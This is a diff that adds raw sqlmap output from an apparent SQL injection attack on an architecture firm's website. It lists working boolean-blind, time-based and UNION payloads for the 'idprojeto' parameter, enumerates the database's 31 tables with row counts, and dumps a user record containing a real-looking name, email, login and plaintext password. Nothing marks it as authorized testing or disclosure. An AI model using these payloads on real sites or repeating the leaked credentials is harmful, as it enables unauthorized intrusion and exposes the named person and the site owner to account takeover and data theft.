@@ -1,0 +1,143 @@
+sqlmap identified the following injection point(s) with a total of 80 HTTP(s) requests:
+---
+Parameter: idprojeto (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: idprojeto=8 AND 7928=7928
+    Vector: AND [INFERENCE]
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: idprojeto=8 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 14 columns
+    Payload: idprojeto=-2505 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716a7a7871,0x576f636a7152556e4e4577766457734449424b6c7659754479426f46696566496f45504f6a6b5278,0x7162717871),NULL-- ayba
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,[QUERY],NULL[GENERIC_SQL_COMMENT]
+---
+web server operating system: Windows 8.1 or 2012 R2
+web application technology: ASP.NET, Microsoft IIS 8.5, ASP
+back-end DBMS: MySQL >= 5.0.12
+available databases [2]:
+[*] cromarquitetur
+[*] information_schema
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: idprojeto (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: idprojeto=8 AND 7928=7928
+    Vector: AND [INFERENCE]
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: idprojeto=8 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 14 columns
+    Payload: idprojeto=-2505 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716a7a7871,0x576f636a7152556e4e4577766457734449424b6c7659754479426f46696566496f45504f6a6b5278,0x7162717871),NULL-- ayba
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,[QUERY],NULL[GENERIC_SQL_COMMENT]
+---
+web server operating system: Windows 8.1 or 2012 R2
+web application technology: ASP.NET, Microsoft IIS 8.5, ASP
+back-end DBMS: MySQL >= 5.0.12
+Database: cromarquitetur
+[31 tables]
++---------------------+
+| _versaobd           |
+| banner              |
+| blogautores         |
+| blogcategorias      |
+| blogfotos           |
+| blogpostagens       |
+| carrinho            |
+| clientes            |
+| configuracaocontato |
+| configuracoes       |
+| contatos            |
+| especializacoes     |
+| fabcidades          |
+| fabconfig           |
+| fabdataseferiados   |
+| fabestados          |
+| fablembretes        |
+| fabpermissoes       |
+| fabpermissoestipos  |
+| imagensfundo        |
+| newsletters         |
+| projetos            |
+| projetosfotos       |
+| redessociais        |
+| sobre               |
+| textos              |
+| usuacessos          |
+| usuareas            |
+| usucargos           |
+| usupermissoes       |
+| usuusuarios         |
++---------------------+
+
+Database: cromarquitetur
++---------------------+---------+
+| Table               | Entries |
++---------------------+---------+
+| contatos            | 369     |
+| usuacessos          | 279     |
+| projetosfotos       | 274     |
+| usupermissoes       | 143     |
+| projetos            | 63      |
+| clientes            | 37      |
+| fabpermissoes       | 31      |
+| banner              | 22      |
+| fabpermissoestipos  | 11      |
+| blogpostagens       | 10      |
+| blogcategorias      | 7       |
+| carrinho            | 7       |
+| usuusuarios         | 7       |
+| redessociais        | 6       |
+| blogautores         | 5       |
+| imagensfundo        | 5       |
+| blogfotos           | 4       |
+| especializacoes     | 4       |
+| newsletters         | 4       |
+| textos              | 3       |
+| usuareas            | 3       |
+| usucargos           | 3       |
+| configuracaocontato | 1       |
+| configuracoes       | 1       |
+| sobre               | 1       |
++---------------------+---------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: idprojeto (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: idprojeto=8 AND 7928=7928
+    Vector: AND [INFERENCE]
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: idprojeto=8 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 14 columns
+    Payload: idprojeto=-2505 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716a7a7871,0x576f636a7152556e4e4577766457734449424b6c7659754479426f46696566496f45504f6a6b5278,0x7162717871),NULL-- ayba
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,[QUERY],NULL[GENERIC_SQL_COMMENT]
+---
+web server operating system: Windows 8.1 or 2012 R2
+web application technology: ASP.NET, Microsoft IIS 8.5, ASP
+back-end DBMS: MySQL >= 5.0.12
+Database: cromarquitetur
+Table: usuusuarios
+[1 entry]
++--------+---------+---------+-----------+---------+---------+---------+--------+------+-------+---------+------------------------------+---------+--------+---------+---------+---------+---------+---------+---------+----------+-----------+---------------------+------------+-------------+-------------+---------------+---------------+---------------+---------------+------------------+
+| idArea | cidade  | idCargo | idUsuario | cep     | cor     | cpf     | nome   | foto | senha | banco   | email                        | conta   | login  | ativo   | bairro  | numero  | estado  | agencia | telFixo | endereco | sobrenome | tsInclusao          | telCelular | complemento | tsAlteracao | anoNascimento | tokenPhoneApp | mesNascimento | diaNascimento | dashboardInicial |
++--------+---------+---------+-----------+---------+---------+---------+--------+------+-------+---------+------------------------------+---------+--------+---------+---------+---------+---------+---------+---------+----------+-----------+---------------------+------------+-------------+-------------+---------------+---------------+---------------+---------------+------------------+
+| 1      | <blank> | 1       | 7         | <blank> | #999999 | <blank> | Wiliam | NULL | 123   | <blank> | wiliam@fabricadetempo.com.br | <blank> | wiliam | <blank> | <blank> | <blank> | <blank> | <blank> | <blank> | <blank>  | <blank>   | 2017-09-04 15:31:34 | <blank>    | <blank>     | NULL        | 0             | NULL          | 0             | 0             | <blank>          |
++--------+---------+---------+-----------+---------+---------+---------+--------+------+-------+---------+------------------------------+---------+--------+---------+---------+---------+---------+---------+---------+----------+-----------+---------------------+------------+-------------+-------------+---------------+---------------+---------------+---------------+------------------+
+
